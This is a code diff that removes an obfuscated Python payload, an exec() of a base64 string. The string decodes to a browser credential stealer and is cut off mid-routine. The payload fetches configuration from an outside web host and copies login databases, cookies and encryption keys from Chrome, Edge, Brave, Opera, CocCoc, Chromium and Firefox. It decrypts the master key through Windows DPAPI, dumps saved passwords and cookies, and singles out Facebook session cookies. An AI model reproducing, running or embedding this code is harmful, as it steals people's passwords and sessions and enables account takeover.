@@ -1,2 +1,492 @@
-import base64
-exec(base64.b64decode('''77u/aW1wb3J0IG9zLGpzb24sc2h1dGlsLHdpbjMyY3J5cHQsc3FsaXRlMyxiYXNlNjQscmFuZG9tDQppbXBvcnQgcmVxdWVzdHMgYXMgeDAxDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZSx0aW1lZGVsdGENCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgREVTMw0KZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMNCmZyb20gcHlhc24xLmNvZGVjLmRlciBpbXBvcnQgZGVjb2Rlcg0KZnJvbSBoYXNobGliIGltcG9ydCBzaGExLCBwYmtkZjJfaG1hYw0KZnJvbSBDcnlwdG8uVXRpbC5QYWRkaW5nIGltcG9ydCB1bnBhZCANCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmltcG9ydCBobWFjLHBsYXRmb3JtDQppbXBvcnQgcmVxdWVzdHMNCnZuID0gJzEnDQpyZXNwb25zZTEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vdGhhaXRyaWNrZXI2OS4wMDB3ZWJob3N0YXBwLmNvbS9OSFQucGhwJykNCmRhdGEgPSByZXNwb25zZTEuanNvbigpDQphcGlib3QxPSBkYXRhWydpZGJvdCddDQppZDE9IGRhdGFbJ2lkY2hhdCddDQoNCg0Kd2luZG93c192ZXJzaW9uID0gcGxhdGZvcm0ucGxhdGZvcm0oKQ0Kbm93ID0gZGF0ZXRpbWUubm93KCkNCnJlc3BvbnNlID14MDEuZ2V0KCJodHRwczovL2lwaW5mby5pbyIpLnRleHQNCmlwX2NvdW50cnkgPSBqc29uLmxvYWRzKHJlc3BvbnNlKQ0KdGVuX2NvdW50cnkgPSBpcF9jb3VudHJ5WydyZWdpb24nXQ0KaXAgPSBpcF9jb3VudHJ5WydpcCddDQpjb3VudHJ5X2NvZGUgPSBpcF9jb3VudHJ5Wydjb3VudHJ5J10NCm5ld3RpbWUgPSBzdHIobm93LmhvdXIpICsgImgiICtzdHIobm93Lm1pbnV0ZSkrIm0iK3N0cihub3cuc2Vjb25kKSsicyIrIi0iK3N0cihub3cuZGF5KSsiLSIrc3RyKG5vdy5tb250aCkrIi0iK3N0cihub3cueWVhcikNCm5hbWVfZiA9IGNvdW50cnlfY29kZSArIiAiKyBpcCArIiAiK25ld3RpbWUNCg0KZGVmIGNoZWNrX2Nocm9tZV9ydW5uaW5nKCk6DQogICAgZm9yIHByb2MgaW4gb3MucG9wZW4oJ3Rhc2tsaXN0JykucmVhZGxpbmVzKCk6DQogICAgICAgIGlmICdjaHJvbWUuZXhlJyBpbiBwcm9jOg0KICAgICAgICAgICAgcmV0dXJuIFRydWUNCiAgICByZXR1cm4gRmFsc2UNCg0KZGVmIGZpbmRfcHJvZmlsZShwYXRoX3VzZXJkYXRhKToNCiAgICBwcm9maWxlX3BhdGggPSBbXQ0KICAgIGZvciBuYW1lIGluIG9zLmxpc3RkaXIocGF0aF91c2VyZGF0YSk6DQogICAgICAgIGlmIG5hbWUuc3RhcnRzd2l0aCgiUHJvZmlsZSIpIG9yIG5hbWUgPT0gJ0RlZmF1bHQnOg0KICAgICAgICAgICAgZGlyX3BhdGggPSBvcy5wYXRoLmpvaW4ocGF0aF91c2VyZGF0YSwgbmFtZSkNCiAgICAgICAgICAgIHByb2ZpbGVfcGF0aC5hcHBlbmQoZGlyX3BhdGgpDQogICAgcmV0dXJuIHByb2ZpbGVfcGF0aA0KDQpkZWYgZ2V0X2Nocm9tZShkYXRhX3BhdGgsY2hyb21lX3BhdGgpOg0KICAgIGRhdGFfY2hyb21lID0gb3MucGF0aC5qb2luKGRhdGFfcGF0aCwgIkNocm9tZSIpO29zLm1rZGlyKGRhdGFfY2hyb21lKQ0KICAgIHByb2ZpbGVzID0gZmluZF9wcm9maWxlKGNocm9tZV9wYXRoKQ0KICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToNCiAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKGRhdGFfY2hyb21lLCJwcm9maWxlIitzdHIoaSkpKQ0KICAgICAgICBkZWYgY29weV9maWxlKCk6DQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ0xvZ2luIERhdGEnKSxvcy5wYXRoLmpvaW4oZGF0YV9jaHJvbWUsInByb2ZpbGUiK3N0cihpKSwnTG9naW4gRGF0YScpKQ0KICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKGNocm9tZV9wYXRoLCdMb2NhbCBTdGF0ZScpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKGNocm9tZV9wYXRoLCdMb2NhbCBTdGF0ZScpLG9zLnBhdGguam9pbihkYXRhX2Nocm9tZSwicHJvZmlsZSIrc3RyKGkpLCdMb2NhbCBTdGF0ZScpKQ0KICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ05ldHdvcmsnLCdDb29raWVzJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTmV0d29yaycsJ0Nvb2tpZXMnKSxvcy5wYXRoLmpvaW4oZGF0YV9jaHJvbWUsInByb2ZpbGUiK3N0cihpKSwnQ29va2llcycpKSANCiAgICAgICAgaWYgY2hlY2tfY2hyb21lX3J1bm5pbmcoKToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgndGFza2tpbGwgL2YgL2ltIGNocm9tZS5leGUnKQ0KICAgICAgICBlbHNlOnBhc3MNCiAgICAgICAgY29weV9maWxlKCk7ZGVsZXRlX2ZpbGUob3MucGF0aC5qb2luKGRhdGFfY2hyb21lLCJwcm9maWxlIitzdHIoaSkpKSAgICANCg0KZGVmIGdldF9lZGdlKGRhdGFfcGF0aCxlZGdlX3BhdGgpOg0KICAgIGRhdGFfZWRnZSA9IG9zLnBhdGguam9pbihkYXRhX3BhdGgsICJFZGdlIik7b3MubWtkaXIoZGF0YV9lZGdlKQ0KICAgIHByb2ZpbGVzID0gZmluZF9wcm9maWxlKGVkZ2VfcGF0aCkNCiAgICBmb3IgaSxwcm9maWxlIGluIGVudW1lcmF0ZShwcm9maWxlcywgMSk6DQogICAgICAgIG9zLm1rZGlyKG9zLnBhdGguam9pbihkYXRhX2VkZ2UsInByb2ZpbGUiK3N0cihpKSkpDQogICAgICAgIGRlZiBjb3B5X2ZpbGUoKToNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdOZXR3b3JrJywnQ29va2llcycpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ05ldHdvcmsnLCdDb29raWVzJyksb3MucGF0aC5qb2luKGRhdGFfZWRnZSwicHJvZmlsZSIrc3RyKGkpLCdDb29raWVzJykpDQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ0xvZ2luIERhdGEnKSxvcy5wYXRoLmpvaW4oZGF0YV9lZGdlLCJwcm9maWxlIitzdHIoaSksJ0xvZ2luIERhdGEnKSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihlZGdlX3BhdGgsJ0xvY2FsIFN0YXRlJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4oZWRnZV9wYXRoLCdMb2NhbCBTdGF0ZScpLG9zLnBhdGguam9pbihkYXRhX2VkZ2UsInByb2ZpbGUiK3N0cihpKSwnTG9jYWwgU3RhdGUnKSkNCiAgICAgICAgDQogICAgICAgIGNvcHlfZmlsZSgpO2RlbGV0ZV9maWxlKG9zLnBhdGguam9pbihkYXRhX2VkZ2UsInByb2ZpbGUiK3N0cihpKSkpICANCg0KZGVmIGdldF9icmF2ZShkYXRhX3BhdGgsYnJhdmVfcGF0aCk6DQogICAgZGF0YV9icmF2ZSA9IG9zLnBhdGguam9pbihkYXRhX3BhdGgsICJCcmF2ZSIpO29zLm1rZGlyKGRhdGFfYnJhdmUpDQogICAgcHJvZmlsZXMgPSBmaW5kX3Byb2ZpbGUoYnJhdmVfcGF0aCkNCiAgICBmb3IgaSxwcm9maWxlIGluIGVudW1lcmF0ZShwcm9maWxlcywgMSk6DQogICAgICAgIG9zLm1rZGlyKG9zLnBhdGguam9pbihkYXRhX2JyYXZlLCJwcm9maWxlIitzdHIoaSkpKQ0KICAgICAgICBkZWYgY29weV9maWxlKCk6DQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTmV0d29yaycsJ0Nvb2tpZXMnKSk6DQogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihwcm9maWxlLCdOZXR3b3JrJywnQ29va2llcycpLG9zLnBhdGguam9pbihkYXRhX2JyYXZlLCJwcm9maWxlIitzdHIoaSksJ0Nvb2tpZXMnKSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdMb2dpbiBEYXRhJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpLG9zLnBhdGguam9pbihkYXRhX2JyYXZlLCJwcm9maWxlIitzdHIoaSksJ0xvZ2luIERhdGEnKSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihicmF2ZV9wYXRoLCdMb2NhbCBTdGF0ZScpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKGJyYXZlX3BhdGgsJ0xvY2FsIFN0YXRlJyksb3MucGF0aC5qb2luKGRhdGFfYnJhdmUsInByb2ZpbGUiK3N0cihpKSwnTG9jYWwgU3RhdGUnKSkNCiAgICAgICAgY29weV9maWxlKCkNCiAgICAgICAgZGVsZXRlX2ZpbGUob3MucGF0aC5qb2luKGRhdGFfYnJhdmUsInByb2ZpbGUiK3N0cihpKSkpDQoNCmRlZiBnZXRfb3BlcmEoZGF0YV9wYXRoLG9wZXJhX3BhdGgpOg0KICAgIGRhdGFfb3BlcmEgPSBvcy5wYXRoLmpvaW4oZGF0YV9wYXRoLCAiT3BlcmEiKTtvcy5ta2RpcihkYXRhX29wZXJhKQ0KICAgIGRlZiBjb3B5X2ZpbGUoKToNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKG9wZXJhX3BhdGgsJ05ldHdvcmsnLCdDb29raWVzJykpOg0KICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihvcGVyYV9wYXRoLCdOZXR3b3JrJywnQ29va2llcycpLG9zLnBhdGguam9pbihkYXRhX29wZXJhLCdDb29raWVzJykpDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihvcGVyYV9wYXRoLCdMb2dpbiBEYXRhJykpOg0KICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihvcGVyYV9wYXRoLCdMb2dpbiBEYXRhJyksb3MucGF0aC5qb2luKGRhdGFfb3BlcmEsJ0xvZ2luIERhdGEnKSkNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKG9wZXJhX3BhdGgsJ0xvY2FsIFN0YXRlJykpOg0KICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihvcGVyYV9wYXRoLCdMb2NhbCBTdGF0ZScpLG9zLnBhdGguam9pbihkYXRhX29wZXJhLCdMb2NhbCBTdGF0ZScpKQ0KICAgIGNvcHlfZmlsZSgpO2RlbGV0ZV9maWxlKGRhdGFfb3BlcmEpDQpkZWYgZ2V0X2NvY2NvYyhkYXRhX3BhdGgsY29jY29jX3BhdGgpOg0KICAgIGRhdGFfY29jY29jPSBvcy5wYXRoLmpvaW4oZGF0YV9wYXRoLCAiQ29jQ29jIik7b3MubWtkaXIoZGF0YV9jb2Njb2MpDQogICAgcHJvZmlsZXMgPSBmaW5kX3Byb2ZpbGUoY29jY29jX3BhdGgpDQogICAgZm9yIGkscHJvZmlsZSBpbiBlbnVtZXJhdGUocHJvZmlsZXMsIDEpOg0KICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4oZGF0YV9jb2Njb2MsInByb2ZpbGUiK3N0cihpKSkpDQogICAgICAgIGRlZiBjb3B5X2ZpbGUoKToNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdOZXR3b3JrJywnQ29va2llcycpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ05ldHdvcmsnLCdDb29raWVzJyksb3MucGF0aC5qb2luKGRhdGFfY29jY29jLCJwcm9maWxlIitzdHIoaSksJ0Nvb2tpZXMnKSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdMb2dpbiBEYXRhJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpLG9zLnBhdGguam9pbihkYXRhX2NvY2NvYywicHJvZmlsZSIrc3RyKGkpLCdMb2dpbiBEYXRhJykpDQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oY29jY29jX3BhdGgsJ0xvY2FsIFN0YXRlJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4oY29jY29jX3BhdGgsJ0xvY2FsIFN0YXRlJyksb3MucGF0aC5qb2luKGRhdGFfY29jY29jLCJwcm9maWxlIitzdHIoaSksJ0xvY2FsIFN0YXRlJykpDQogICAgICAgIGNvcHlfZmlsZSgpOyAgICANCiAgICAgICAgZGVsZXRlX2ZpbGUob3MucGF0aC5qb2luKGRhdGFfY29jY29jLCJwcm9maWxlIitzdHIoaSkpKQ0KICAgICAgICANCg0KZGVmIGdldF9jaHJvbWl1bShkYXRhX3BhdGgsY2hyb21pdW1fcGF0aCk6DQogICAgZGF0YV9jaHJvbWl1bT0gb3MucGF0aC5qb2luKGRhdGFfcGF0aCwgIkNocm9taXVtIik7b3MubWtkaXIoZGF0YV9jaHJvbWl1bSkNCiAgICBwcm9maWxlcyA9IGZpbmRfcHJvZmlsZShjaHJvbWl1bV9wYXRoKQ0KICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToNCiAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKGRhdGFfY2hyb21pdW0sInByb2ZpbGUiK3N0cihpKSkpDQogICAgICAgIGRlZiBjb3B5X2ZpbGUoKToNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdDb29raWVzJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnQ29va2llcycpLG9zLnBhdGguam9pbihkYXRhX2Nocm9taXVtLCJwcm9maWxlIitzdHIoaSksJ0Nvb2tpZXMnKSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdMb2dpbiBEYXRhJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpLG9zLnBhdGguam9pbihkYXRhX2Nocm9taXVtLCJwcm9maWxlIitzdHIoaSksJ0xvZ2luIERhdGEnKSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihjaHJvbWl1bV9wYXRoLCdMb2NhbCBTdGF0ZScpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKGNocm9taXVtX3BhdGgsJ0xvY2FsIFN0YXRlJyksb3MucGF0aC5qb2luKGRhdGFfY2hyb21pdW0sInByb2ZpbGUiK3N0cihpKSwnTG9jYWwgU3RhdGUnKSkNCiAgICAgICAgY29weV9maWxlKCk7ZGVsZXRlX2ZpbGUob3MucGF0aC5qb2luKGRhdGFfY2hyb21pdW0sInByb2ZpbGUiK3N0cihpKSkpDQpkZWYgZmluZF9wcm9maWxlX2ZpcmVmb3goZmlyZWZveF9wYXRoKToNCiAgICBwcm9maWxlX3BhdGggPSBbXQ0KICAgIGZvciBuYW1lIGluIG9zLmxpc3RkaXIoZmlyZWZveF9wYXRoKToNCiAgICAgICAgICAgIGRpcl9wYXRoID0gb3MucGF0aC5qb2luKGZpcmVmb3hfcGF0aCwgbmFtZSkNCiAgICAgICAgICAgIHByb2ZpbGVfcGF0aC5hcHBlbmQoZGlyX3BhdGgpDQogICAgcmV0dXJuIHByb2ZpbGVfcGF0aA0KDQpkZWYgZ2V0X2ZpcmVmb3goZGF0YV9wYXRoLGZpcmVmb3hfcGF0aCk6DQogICAgZGF0YV9maXJlZm94ID0gb3MucGF0aC5qb2luKGRhdGFfcGF0aCwnZmlyZWZveCcpO29zLm1rZGlyKGRhdGFfZmlyZWZveCkNCiAgICBwcm9maWxlcyA9IGZpbmRfcHJvZmlsZV9maXJlZm94KGZpcmVmb3hfcGF0aCkNCiAgIA0KICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToNCiAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKGRhdGFfZmlyZWZveCwicHJvZmlsZSIrc3RyKGkpKSkNCiAgICAgICAgZGVmIGNvcHlfZmlsZSgpOg0KICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ2Nvb2tpZXMuc3FsaXRlJykpOg0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnY29va2llcy5zcWxpdGUnKSxvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSksJ2Nvb2tpZXMuc3FsaXRlJykpDQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ocHJvZmlsZSwna2V5NC5kYicpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ2tleTQuZGInKSxvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSksJ2tleTQuZGInKSkNCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdsb2dpbnMuanNvbicpKToNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ2xvZ2lucy5qc29uJyksb3MucGF0aC5qb2luKGRhdGFfZmlyZWZveCwicHJvZmlsZSIrc3RyKGkpLCdsb2dpbnMuanNvbicpKQ0KICAgICAgICBjb3B5X2ZpbGUoKQ0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSksJ2Nvb2tpZXMuc3FsaXRlJykpOg0KDQogICAgICAgICAgICBkZWxldGVfZmlyZWZveChvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSkpKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgc2h1dGlsLnJtdHJlZShvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSkpKSAgIA0KZGVmIGVuY3J5cHQoZGF0YV9wcm9maWxlKToNCiAgICBsb2dpbl9kYiA9IG9zLnBhdGguam9pbihkYXRhX3Byb2ZpbGUsICJMb2dpbiBEYXRhIikNCiAgICBrZXlfZGIgPSBvcy5wYXRoLmpvaW4oZGF0YV9wcm9maWxlICwiTG9jYWwgU3RhdGUiLCkNCiAgICBjb29raWVfZGIgPSBvcy5wYXRoLmpvaW4oZGF0YV9wcm9maWxlLCAiQ29va2llcyIpDQogICAgd2l0aCBvcGVuKGtleV9kYiwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOg0KICAgICAgICBsb2NhbF9zdGF0ZSA9IGYucmVhZCgpDQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2Fkcyhsb2NhbF9zdGF0ZSkNCiAgICBtYXN0ZXJfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQ0KICAgIG1hc3Rlcl9rZXkgPSBtYXN0ZXJfa2V5WzU6XSAgDQogICAgbWFzdGVyX2tleSA9IHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdDQogICAgdHJ5IDoNCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbl9kYikNCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucyIpDQogICAgICAgIGZvciByIGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgdXJsID0gclswXQ0KICAgICAgICAgICAgdXNlcm5hbWUgPSByWzFdDQogICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSByWzJdDQogICAgICAgICAgICBpdiA9IGVuY3J5cHRlZF9wYXNzd29yZFszOjE1XQ0KICAgICAgICAgICAgcGF5bG9hZCA9IGVuY3J5cHRlZF9wYXNzd29yZFsxNTpdDQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpDQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKSANCiAgICAgICAgICAgIHdpdGggb3Blbigob3MucGF0aC5qb2luKGRhdGFfcHJvZmlsZSwgInBhc3MudHh0IikpLCAnYScsZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgICAgICAgICBmLndyaXRlKCJVUkw6ICIgKyB1cmwgKyAiXHRcdCIgKyB1c2VybmFtZSArICJ8IiArIGRlY3J5cHRlZF9wYXNzd29yZCArICJcbiIgKyAiXG4iKSAgICAgIA0KICAgIGV4Y2VwdCA6DQogICAgICAgIHByaW50KCJzYWkgbWUgciAiKQ0KICAgIHRyeTogICAgDQogICAgICAgIGNvbm4yID0gc3FsaXRlMy5jb25uZWN0KGNvb2tpZV9kYikNCiAgICAgICAgY29ubjIudGV4dF9mYWN0b3J5ID0gbGFtYmRhIGI6IGIuZGVjb2RlKGVycm9ycz0iaWdub3JlIikNCiAgICAgICAgY3Vyc29yMiA9IGNvbm4yLmN1cnNvcigpDQogICAgICAgIGN1cnNvcjIuZXhlY3V0ZSgiIiINCiAgICAgICAgU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCB2YWx1ZSwgZW5jcnlwdGVkX3ZhbHVlLGlzX2h0dHBvbmx5LGlzX3NlY3VyZSxleHBpcmVzX3V0Yw0KICAgICAgICBGUk9NIGNvb2tpZXMNCiAgICAgICAgIiIiKQ0KICAgICAgICBqc29uX2RhdGEgPSBbXQ0KICAgICAgICBmb3IgaG9zdF9rZXksIG5hbWUsIHZhbHVlLGVuY3J5cHRlZF92YWx1ZSxpc19odHRwb25seSxpc19zZWN1cmUsZXhwaXJlc191dGMgaW4gY3Vyc29yMi5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgaWYgbm90IHZhbHVlOg0KICAgICAgICAgICAgICAgIGl2ID0gZW5jcnlwdGVkX3ZhbHVlWzM6MTVdDQogICAgICAgICAgICAgICAgZW5jcnlwdGVkX3ZhbHVlID0gZW5jcnlwdGVkX3ZhbHVlWzE1Ol0NCiAgICAgICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgICAgICAgICAgZGVjcnlwdGVkX3ZhbHVlID0gY2lwaGVyLmRlY3J5cHQoZW5jcnlwdGVkX3ZhbHVlKVs6LTE2XS5kZWNvZGUoKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfdmFsdWUgPSB2YWx1ZSAgICAgDQogICAgICAgICAgICBqc29uX2RhdGEuYXBwZW5kKHsNCiAgICAgICAgICAgICAgICAiaG9zdCI6IGhvc3Rfa2V5LA0KICAgICAgICAgICAgICAgICJuYW1lIjogbmFtZSwNCiAgICAgICAgICAgICAgICAidmFsdWUiOiBkZWNyeXB0ZWRfdmFsdWUsDQogICAgICAgICAgICAgICAgImlzX2h0dHBvbmx5Ijppc19odHRwb25seSwNCiAgICAgICAgICAgICAgICAiaXNfc2VjdXJlIjppc19zZWN1cmUsDQogICAgICAgICAgICAgICAgImV4cGlyZXNfdXRjIjpleHBpcmVzX3V0Yw0KICAgICAgICAgICAgICAgIH0pDQogICAgICAgICAgICANCiAgICAgICAgcmVzdWx0ID0gW10NCiAgICAgICAgZm9yIGl0ZW0gaW4ganNvbl9kYXRhOg0KICAgICAgICAgICAgaG9zdCA9IGl0ZW1bImhvc3QiXQ0KICAgICAgICAgICAgbmFtZSA9IGl0ZW1bIm5hbWUiXQ0KICAgICAgICAgICAgdmFsdWUgPSBpdGVtWyJ2YWx1ZSJdDQogICAgICAgICAgICBpc19odHRwb25seT0gaXRlbVsiaXNfaHR0cG9ubHkiXQ0KICAgICAgICAgICAgaXNfc2VjdXJlPWl0ZW1bImlzX3NlY3VyZSJdDQogICAgICAgICAgICBleHBpcmVzX3V0YyA9IGl0ZW1bImV4cGlyZXNfdXRjIl0NCiAgICAgICAgICAgIGlmIGhvc3QgPT0gIi5mYWNlYm9vay5jb20iOg0KICAgICAgICAgICAgICAgIHJlc3VsdC5hcHBlbmQoZiJ7bmFtZX0gPSB7dmFsdWV9IikNCiAgICAgICAgICAgIGlmIGlzX2h0dHBvbmx5ID09IDEgOiBodHRwb25seSA9ICJUUlVFIg0KICAgICAgICAgICAgZWxzZTpodHRwb25seSA9ICJGQUlMU0UiDQogICAgICAgICAgICBpZiBpc19zZWN1cmUgPT0gMSA6IHNlY3VyZSA9ICJUUlVFIg0KICAgICAgICAgICAgZWxzZTpzZWN1cmUgPSAiRkFJTFNFIg0KICAgICAgICAgICAgY29va2llID0gZiJ7aG9zdH1cdHtodHRwb25seX1cdHsnLyd9XHR7c2VjdXJlfVx0XHR7bmFtZX1cdHt2YWx1ZX1cbiIgICAgICAgICAgDQogICAgICAgICAgICB3aXRoIG9wZW4oKG9zLnBhdGguam9pbihkYXRhX3Byb2ZpbGUsICJjb29raWUudHh0IikpLCAnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgZi53cml0ZShjb29raWUpDQogICAgICAgIHJlc3VsdF9zdHJpbmcgPSAiOyAiLmpvaW4ocmVzdWx0KQ0KICAgICAgICB3aXRoIG9wZW4oKG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJURU1QIl0sIG5hbWVfZiwgImNvb2tpZWZiLnR4dCIpKSwgJ2EnLGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6DQogICAgICAgICAgICBmLndyaXRlKHJlc3VsdF9zdHJpbmcrIlxuIiArICJcbiIpDQogICAgZXhjZXB0Og0KICAgICAgICBwcmludCgibGFpIHNhaSByICIpDQpkZWYgZGVsZXRlX2ZpbGUoZGF0YV9wcm9maWxlKToNCiAgDQogICAgdHJ5Og0KICAgICAgICBlbmNyeXB0KGRhdGFfcHJvZmlsZSkNCiAgICBleGNlcHQ6cGFzcw0KICAgDQoNCmRlZiBkZWNyeXB0TW96M0RFUyggZ2xvYmFsU2FsdCwgZW50cnlTYWx0LCBlbmNyeXB0ZWREYXRhICk6DQogIGhwID0gc2hhMSggZ2xvYmFsU2FsdCApLmRpZ2VzdCgpDQogIHBlcyA9IGVudHJ5U2FsdCArIGInXHgwMCcqKDIwLWxlbihlbnRyeVNhbHQpKQ0KICBjaHAgPSBzaGExKCBocCtlbnRyeVNhbHQgKS5kaWdlc3QoKQ0